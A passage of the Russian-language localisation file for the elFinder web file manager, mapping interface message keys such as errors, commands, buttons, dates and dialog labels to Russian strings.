/**
 * Русский язык translation
 * @author Dmitry "dio" Levashov <dio@std42.ru>
 * @author Andrew Berezovsky <andrew.berezovsky@gmail.com>
 * @author Alex Yashkin <alex@yashkin.by>
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.ru = {
		translator : 'Dmitry "dio" Levashov &lt;dio@std42.ru&gt;, Andrew Berezovsky &lt;andrew.berezovsky@gmail.com&gt;, Alex Yashkin &lt;alex@yashkin.by&gt;',
		language   : 'Русский язык',
		direction  : 'ltr',
		dateFormat : 'd M Y H:i', // will show like: 03 Мар 2022 11:22
		fancyDateFormat : '$1 H:i', // will show like: Сегодня 11:22
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220303-112216
		messages   : {
			'getShareText' : 'Делиться',
			'Editor ': 'Редактор кода',

			/********************************** errors **********************************/
			'error'                : 'Ошибка',
			'errUnknown'           : 'Неизвестная ошибка.',
			'errUnknownCmd'        : 'Неизвестная команда.',
			'errJqui'              : 'Отсутствуют необходимые компоненты jQuery UI - selectable, draggable и droppable.',
			'errNode'              : 'Отсутствует DOM элемент для инициализации elFinder.',
			'errURL'               : 'Неверная конфигурация elFinder! Не указан URL.',
			'errAccess'            : 'Доступ запрещен.',
			'errConnect'           : 'Не удалось соединиться с сервером.',
			'errAbort'             : 'Соединение прервано.',
			'errTimeout'           : 'Таймаут соединения.',
			'errNotFound'          : 'Сервер не найден.',
			'errResponse'          : 'Некорректный ответ сервера.',
			'errConf'              : 'Некорректная настройка сервера.',
			'errJSON'              : 'Модуль PHP JSON не установлен.',
			'errNoVolumes'         : 'Отсутствуют корневые директории достуные для чтения.',
			'errCmdParams'         : 'Некорректные параметры команды "$1".',
			'errDataNotJSON'       : 'Данные не в формате JSON.',
			'errDataEmpty'         : 'Данные отсутствуют.',
			'errCmdReq'            : 'Для запроса к серверу необходимо указать имя команды.',
			'errOpen'              : 'Не удалось открыть "$1".',
			'errNotFolder'         : 'Объект не является папкой.',
			'errNotFile'           : 'Объект не является файлом.',
			'errRead'              : 'Ошибка чтения "$1".',
			'errWrite'             : 'Ошибка записи в "$1".',
			'errPerm'              : 'Доступ запрещен.',
			'errLocked'            : '"$1" защищен и не может быть переименован, перемещен или удален.',
			'errExists'            : 'В папке уже существует файл с именем "$1".',
			'errInvName'           : 'Недопустимое имя файла.',
			'errInvDirname'        : 'Недопустимое имя папки.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Папка не найдена.',
			'errFileNotFound'      : 'Файл не найден.',
			'errTrgFolderNotFound' : 'Целевая папка "$1" не найдена.',
			'errPopup'             : 'Браузер заблокировал открытие нового окна. Чтобы открыть файл, измените настройки браузера.',
			'errMkdir'             : 'Ошибка создания папки "$1".',
			'errMkfile'            : 'Ошибка создания файла "$1".',
			'errRename'            : 'Ошибка переименования "$1".',
			'errCopyFrom'          : 'Копирование файлов из директории "$1" запрещено.',
			'errCopyTo'            : 'Копирование файлов в директорию "$1" запрещено.',
			'errMkOutLink'         : 'Невозможно создать ссылку вне корня раздела.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Ошибка загрузки.',  // old name - errUploadCommon
			'errUploadFile'        : 'Невозможно загрузить "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Нет файлов для загрузки.',
			'errUploadTotalSize'   : 'Превышен допустимый размер загружаемых данных.', // old name - errMaxSize
			'errUploadFileSize'    : 'Размер файла превышает допустимый.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Недопустимый тип файла.',
			'errUploadTransfer'    : 'Ошибка передачи файла "$1".',
			'errUploadTemp'        : 'Невозможно создать временный файл для загрузки.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Объект "$1" по этому адресу уже существует и не может быть заменен объектом другого типа.', // new
			'errReplace'           : 'Невозможно заменить "$1".',
			'errSave'              : 'Невозможно сохранить "$1".',
			'errCopy'              : 'Невозможно скопировать "$1".',
			'errMove'              : 'Невозможно переместить "$1".',
			'errCopyInItself'      : 'Невозможно скопировать "$1" в самого себя.',
			'errRm'                : 'Невозможно удалить "$1".',
			'errTrash'             : 'Невозможно переместить в корзину.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Невозможно удалить файлы источника.',
			'errExtract'           : 'Невозможно извлечь фалы из "$1".',
			'errArchive'           : 'Невозможно создать архив.',
			'errArcType'           : 'Неподдерживаемый тип архива.',
			'errNoArchive'         : 'Файл не является архивом или неподдерживаемый тип архива.',
			'errCmdNoSupport'      : 'Сервер не поддерживает эту команду.',
			'errReplByChild'       : 'Невозможно заменить папку "$1" содержащимся в ней объектом.',
			'errArcSymlinks'       : 'По соображениям безопасности запрещена распаковка архивов, содержащих ссылки (symlinks) или файлы с недопустимыми именами.', // edited 24.06.2012
			'errArcMaxSize'        : 'Размер файлов в архиве превышает максимально разрешенный.',
			'errResize'            : 'Не удалось изменить размер "$1".',
			'errResizeDegree'      : 'Некорректный градус поворота.',  // added 7.3.2013
			'errResizeRotate'      : 'Невозможно повернуть изображение.',  // added 7.3.2013
			'errResizeSize'        : 'Некорректный размер изображения.',  // added 7.3.2013
			'errResizeNoChange'    : 'Размер изображения не изменился.',  // added 7.3.2013
			'errUsupportType'      : 'Неподдерживаемый тип файла.',
			'errNotUTF8Content'    : 'Файл "$1" содержит текст в кодировке отличной от UTF-8 и не может быть отредактирован.',  // added 9.11.2011
			'errNetMount'          : 'Невозможно подключить "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Неподдерживаемый протокол.',     // added 17.04.2012
			'errNetMountFailed'    : 'Ошибка монтирования.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Требуется указать хост.', // added 18.04.2012
			'errSessionExpires'    : 'Сессия была завершена так как превышено время отсутствия активности.',
			'errCreatingTempDir'   : 'Невозможно создать временную директорию: "$1"',
			'errFtpDownloadFile'   : 'Невозможно скачать файл с FTP: "$1"',
			'errFtpUploadFile'     : 'Невозможно загрузить файл на FTP: "$1"',
			'errFtpMkdir'          : 'Невозможно создать директорию на FTP: "$1"',
			'errArchiveExec'       : 'Ошибка при выполнении архивации: "$1"',
			'errExtractExec'       : 'Ошибка при выполнении распаковки: "$1"',
			'errNetUnMount'        : 'Невозможно отключить', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Не конвертируется в UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Если вы хотите загружать папки, попробуйте Google Chrome.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Превышено время ожидания при поиске "$1". Результаты поиска частичные.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Требуется повторная авторизация.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Максимальное число выбираемых файлов: $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Невозможно восстановить из корзины. Не удалось определить путь для восстановления.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Не найден редактор для этого типа файлов.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Возникла ошибка на стороне сервера.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Невозможно очистить папку "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Еще ошибок: $1', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Вы можете создать до $1 папки одновременно.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Создать архив',
			'cmdback'      : 'Назад',
			'cmdcopy'      : 'Копировать',
			'cmdcut'       : 'Вырезать',
			'cmddownload'  : 'Скачать',
			'cmdduplicate' : 'Сделать копию',
			'cmdedit'      : 'Редактировать файл',
			'cmdextract'   : 'Распаковать архив',
			'cmdforward'   : 'Вперед',
			'cmdgetfile'   : 'Выбрать файлы',
			'cmdhelp'      : 'О программе',
			'cmdhome'      : 'Домой',
			'cmdinfo'      : 'Свойства',
			'cmdmkdir'     : 'Новая папка',
			'cmdmkdirin'   : 'В новую папку', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Новый файл',
			'cmdopen'      : 'Открыть',
			'cmdpaste'     : 'Вставить',
			'cmdquicklook' : 'Быстрый просмотр',
			'cmdreload'    : 'Обновить',
			'cmdrename'    : 'Переименовать',
			'cmdrm'        : 'Удалить',
			'cmdtrash'     : 'Переместить в корзину', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Восстановить', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Поиск файлов',
			'cmdup'        : 'Наверх',
			'cmdupload'    : 'Загрузить файлы',
			'cmdview'      : 'Вид',
			'cmdresize'    : 'Изменить размер и повернуть',
			'cmdsort'      : 'Сортировать',
			'cmdnetmount'  : 'Подключить сетевой раздел', // added 18.04.2012
			'cmdnetunmount': 'Отключить', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'В избранное', // added 28.12.2014
			'cmdchmod'     : 'Изменить права доступа', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Открыть папку', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Сбросить ширину колонок', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Полный экран', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Переместить', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Очистить папку', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Отменить', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Вернуть', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Предпочтения', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Выбрать все', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Отменить выбор', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Инвертировать выбор', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Открыть в новом окне', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Скрыть (персонально)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Закрыть',
			'btnSave'   : 'Сохранить',
			'btnRm'     : 'Удалить',
			'btnApply'  : 'Применить',
			'btnCancel' : 'Отмена',
			'btnNo'     : 'Нет',
			'btnYes'    : 'Да',
			'btnMount'  : 'Подключить',  // added 18.04.2012
			'btnApprove': 'Перейти в $1 и применить', // from v2.1 added 26.04.2012
			'btnUnmount': 'Отключить', // from v2.1 added 30.04.2012
			'btnConv'   : 'Конвертировать', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Здесь',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Раздел',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Все',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME тип', // from v2.1 added 22.5.2015
			'btnFileName':'Имя файла',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Сохранить и закрыть', // from v2.1 added 12.6.2015
			'btnBackup' : 'Резервная копия', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Переименовать',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Переименовать (все)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Пред. ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'След. ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Сохранить как', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Открыть папку',
			'ntffile'     : 'Открыть файл',
			'ntfreload'   : 'Обновить текущую папку',
			'ntfmkdir'    : 'Создание папки',
			'ntfmkfile'   : 'Создание файлов',
			'ntfrm'       : 'Удалить файлы',
			'ntfcopy'     : 'Скопировать файлы',
			'ntfmove'     : 'Переместить файлы',
			'ntfprepare'  : 'Подготовка к копированию файлов',
			'ntfrename'   : 'Переименовать файлы',
			'ntfupload'   : 'Загрузка файлов',
			'ntfdownload' : 'Скачивание файлов',
			'ntfsave'     : 'Сохранить файлы',
			'ntfarchive'  : 'Создание архива',
			'ntfextract'  : 'Распаковка архива',
			'ntfsearch'   : 'Поиск файлов',
			'ntfresize'   : 'Изменение размеров изображений',
			'ntfsmth'     : 'Занят важным делом',
			'ntfloadimg'  : 'Загрузка изображения',
			'ntfnetmount' : 'Подключение сетевого диска', // added 18.04.2012
			'ntfnetunmount': 'Отключение сетевого диска', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Получение размеров изображения', // added 20.05.2013
			'ntfreaddir'  : 'Чтение информации о папке', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Получение URL ссылки', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Изменение прав доступа к файлу', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Проверка измени загруженного файла', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Создание файла для скачки', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Получение информации о пути', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Обработка загруженного файла', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Перемещение в корзину', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Восстановление из корзины', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Проверка папки назначения', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Отмена предыдущей операции', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Восстановление предыдущей операции', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Проверка содержимого', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Корзина', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'неизвестно',
			'Today'       : 'Сегодня',
			'Yesterday'   : 'Вчера',
			'msJan'       : 'Янв',
			'msFeb'       : 'Фев',
			'msMar'       : 'Мар',
			'msApr'       : 'Апр',
			'msMay'       : 'Май',
			'msJun'       : 'Июн',
			'msJul'       : 'Июл',
			'msAug'       : 'Авг',
			'msSep'       : 'Сен',
			'msOct'       : 'Окт',
			'msNov'       : 'Ноя',
			'msDec'       : 'Дек',
			'January'     : 'Январь',
			'February'    : 'Февраль',
			'March'       : 'Март',
			'April'       : 'Апрель',
			'May'         : 'Май',
			'June'        : 'Июнь',
			'July'        : 'Июль',
			'August'      : 'Август',
			'September'   : 'Сентябрь',
			'October'     : 'Октябрь',
			'November'    : 'Ноябрь',
			'December'    : 'Декабрь',
			'Sunday'      : 'Воскресенье',
			'Monday'      : 'Понедельник',
			'Tuesday'     : 'Вторник',
			'Wednesday'   : 'Среда',
			'Thursday'    : 'Четверг',
			'Friday'      : 'Пятница',
			'Saturday'    : 'Суббота',
			'Sun'         : 'Вск',
			'Mon'         : 'Пнд',
			'Tue'         : 'Втр',
			'Wed'         : 'Срд',
			'Thu'         : 'Чтв',
			'Fri'         : 'Птн',
			'Sat'         : 'Сбт',

			/******************************** sort variants ********************************/
			'sortname'          : 'по имени',
			'sortkind'          : 'по типу',
			'sortsize'          : 'по размеру',
			'sortdate'          : 'по дате',
			'sortFoldersFirst'  : 'Папки в начале',
			'sortperm'          : 'по разрешениям', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'по режиму',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'по владельцу',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'по группе',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Также и дерево каталогов',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'НовыйФайл.txt', // added 10.11.2015
			'untitled folder'   : 'НоваяПапка',   // added 10.11.2015
			'Archive'           : 'НовыйАрхив',  // from v2.1 added 10.11.2015
			'untitled file'     : 'НовыйФайл.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1 Файл',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Необходимо подтверждение',
			'confirmRm'       : 'Вы уверены, что хотите удалить файлы?<br>Действие необратимо!',
			'confirmRepl'     : 'Заменить старый файл новым?',
			'confirmRest'     : 'Заменить существующий файл файлом из корзины?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Не UTF-8<br/>Сконвертировать в UTF-8?<br/>Данные станут UTF-8 при сохранении после конвертации.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Невозможно определить кодировку файла. Необходима предварительная конвертация файла в UTF-8 для дальнейшего редактирования.<br/>Выберите кодировку файла.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Произошли изменения.<br/>Если не сохраните изменения, то потеряете их.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Вы уверены, что хотите переместить файлы в корзину?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Вы уверены, что хотите переместить файлы в "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Применить для всех',
			'name'            : 'Имя',
			'size'            : 'Размер',
			'perms'           : 'Доступ',
			'modify'          : 'Изменен',
			'kind'            : 'Тип',
			'read'            : 'чтение',
			'write'           : 'запись',
			'noaccess'        : 'нет доступа',
			'and'             : 'и',
			'unknown'         : 'неизвестно',
			'selectall'       : 'Выбрать все файлы',
			'selectfiles'     : 'Выбрать файл(ы)',
			'selectffile'     : 'Выбрать первый файл',
			'selectlfile'     : 'Выбрать последний файл',
			'viewlist'        : 'В виде списка',
			'viewicons'       : 'В виде иконок',
			'viewSmall'       : 'Маленькие иконки', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Средние иконки', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Большие иконки', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Очень большие иконки', // from v2.1.39 added 22.5.2018
			'places'          : 'Избранное',
			'calc'            : 'Вычислить',
			'path'            : 'Путь',
			'aliasfor'        : 'Указывает на',
			'locked'          : 'Защита',
			'dim'             : 'Размеры',
			'files'           : 'Файлы',
			'folders'         : 'Папки',
			'items'           : 'Объекты',
			'yes'             : 'да',
			'no'              : 'нет',
			'link'            : 'Ссылка',
			'searcresult'     : 'Результаты поиска',
			'selected'        : 'выбрано',
			'about'           : 'О программе',
			'shortcuts'       : 'Горячие клавиши',
			'help'            : 'Помощь',
			'webfm'           : 'Файловый менеджер для Web',
			'ver'             : 'Версия',
			'protocolver'     : 'версия протокола',
			'homepage'        : 'Сайт проекта',
			'docs'            : 'Документация',
			'github'          : 'Форкните на GitHub',
			'twitter'         : 'Следите в Twitter',
			'facebook'        : 'Присоединяйтесь на Facebook',
			'team'            : 'Команда',
			'chiefdev'        : 'ведущий разработчик',
			'developer'       : 'разработчик',
			'contributor'     : 'участник',
			'maintainer'      : 'сопровождение проекта',
			'translator'      : 'переводчик',
			'icons'           : 'Иконки',
			'dontforget'      : 'и не забудьте взять своё полотенце',
			'shortcutsof'     : 'Горячие клавиши отключены',
			'dropFiles'       : 'Перетащите файлы сюда',
			'or'              : 'или',
			'selectForUpload' : 'Выбрать файлы для загрузки',
			'moveFiles'       : 'Переместить файлы',
			'copyFiles'       : 'Скопировать файлы',
			'restoreFiles'    : 'Восстановить файлы', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Удалить из избранного',
			'aspectRatio'     : 'Соотношение сторон',
			'scale'           : 'Масштаб',
			'width'           : 'Ширина',
			'height'          : 'Высота',
			'resize'          : 'Изменить размер',
			'crop'            : 'Обрезать',
			'rotate'          : 'Повернуть',
			'rotate-cw'       : 'Повернуть на 90 градусов по часовой стрелке',
			'rotate-ccw'      : 'Повернуть на 90 градусов против часовой стрелке',
			'degree'          : '°',
			'netMountDialogTitle' : 'Подключить сетевой диск', // added 18.04.2012
			'protocol'            : 'Протокол', // added 18.04.2012
			'host'                : 'Хост', // added 18.04.2012
			'port'                : 'Порт', // added 18.04.2012
			'user'                : 'Пользователь', // added 18.04.2012
			'pass'                : 'Пароль', // added 18.04.2012
			'confirmUnmount'      : 'Вы хотите отключить $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Перетащите или вставьте файлы из браузера', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Перетащите или вставьте файлы и ссылки сюда', // from v2.1 added 07.04.2014
			'encoding'        : 'Кодировка', // from v2.1 added 19.12.2014
			'locale'          : 'Локаль',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Цель: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Поиск по введенному MIME типу', // from v2.1 added 22.5.2015
			'owner'           : 'Владелец', // from v2.1 added 20.6.2015
			'group'           : 'Группа', // from v2.1 added 20.6.2015
			'other'           : 'Остальные', // from v2.1 added 20.6.2015
			'execute'         : 'Исполнить', // from v2.1 added 20.6.2015
			'perm'            : 'Разрешение', // from v2.1 added 20.6.2015
			'mode'            : 'Режим', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Папка пуста', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Папка пуста\\A Перетащите чтобы добавить', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Папка пуста\\A Долгое нажатие чтобы добавить', // from v2.1.6 added 30.12.2015
			'quality'         : 'Качество', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Авто синхронизация',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Передвинуть вверх',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Получить URL ссылку', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Выбранные объекты ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID папки', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Позволить автономный доступ', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Авторизоваться повторно', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Загружается...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Открыть несколько файлов', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Вы пытаетесь открыть $1 файл(а/ов). Вы уверены, что хотите открыть их в браузере?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Ничего не найдено', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Это редактируемый файл.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Вы выбрали $1 файл(-ов).', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'У вас $1 файл(-ов) в буфере обмена.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Инкрементный поиск возможен только из текущего вида.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Восстановить', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 завершен', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Контекстное меню', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Переключение страницы', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Корни томов', // from v2.1.16 added 16.9.2016
			'reset'           : 'Сбросить', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Фоновый цвет', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Выбор цвета', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px сетка', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Включено', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Отключено', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Ничего не найдено в текущем виде.\\AНажмите [Enter] для развертывания цели поиска.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Поиск по первому символу не дал результатов в текущем виде.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Текстовая метка', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 минут осталось', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Переоткрыть с выбранной кодировкой', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Сохранить с выбранной кодировкой', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Выбрать папку', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Поиск по первому символу', // from v2.1.23 added 24.3.2017
			'presets'         : 'Пресеты', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Слишком много файлов для перемещения в корзину.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Текстовая область', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Очистить папку "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Нет файлов в паке "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Настройки', // from v2.1.26 added 28.6.2017
			'language'        : 'Язык', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Сбросить настройки для этого браузера', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Настройки панели', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... еще символов: $1.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... еще строк: $1.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Общий размер', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Приблизительный размер файла', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Фокус на элементе диалога при наведении мыши',  // from v2.1.30 added 2.11.2017
			'select'          : 'Выбрать', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Действие при выборе файла', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Открывать в редакторе, выбранном в прошлый раз', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Выбрать элементы с инвертированием', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Переименовать выбранные элементы ($1 шт.) в $2?<br/>Действие нельзя отменить!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Групповое переименование', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Число', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Добавить префикс', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Добавить суффикс', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Изменить расширение', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Настройки колонок (для просмотра в виде списка)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Все изменения будут немедленно отражены в архиве.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Изменения не вступят в силу до тех пор, пока вы не размонтируете этот том.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Тома, смонтированные на этом томе, также будут размонтированы. Вы хотите отключить его?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Свойства', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Алгоритмы для отображения хеш-сумм файлов', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Элементы в панели свойств', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Нажмите снова для выхода.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Панель', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Рабочая область', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Диалог', // from v2.1.38 added 4.4.2018
			'all'             : 'Все', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Размер иконок (В виде иконок)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Открывать редактор в развернутом виде', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Так как конвертация с помощью API недоступно, произведите конвертацию на веб-сайте.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'После конвертации вы должны загрузить скачанный файл, чтобы сохранить его.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Конвертировать на сайте $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Интеграции', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Менеджер elFinder интегрирован со следующими внешними сервисами. Ознакомьтесь с правилами пользования, политиками безопасности и др. перед их использованием.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Показать скрытые элементы', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Скрыть скрытые элементы', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Показать/скрыть скрытые элементы', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Типы файлов в меню "Новый файл"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Тип текстового файла', // from v2.1.41 added 7.8.2018
			'add'             : 'Добавить', // from v2.1.41 added 7.8.2018
			'theme'           : 'Тема', // from v2.1.43 added 19.10.2018
			'default'         : 'По умолчанию', // from v2.1.43 added 19.10.2018
			'description'     : 'Описание', // from v2.1.43 added 19.10.2018
			'website'         : 'Веб-сайт', // from v2.1.43 added 19.10.2018
			'author'          : 'Автор', // from v2.1.43 added 19.10.2018
			'email'           : 'Эл. адрес', // from v2.1.43 added 19.10.2018
			'license'         : 'Лицензия', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Невозможно сохранить файл. Чтобы не потерять изменения, экспортируйте их на свой ПК.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Двойной клик по файлу для его выбора.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Использовать полноэкранный режим', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Неизвестный',
			'kindRoot'        : 'Корень тома', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Папка',
			'kindSelects'     : 'Выбор', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Ссылка',
			'kindAliasBroken' : 'Битая ссылка',
			// applications
			'kindApp'         : 'Приложение',
			'kindPostscript'  : 'Документ Postscript',
			'kindMsOffice'    : 'Документ Microsoft Office',
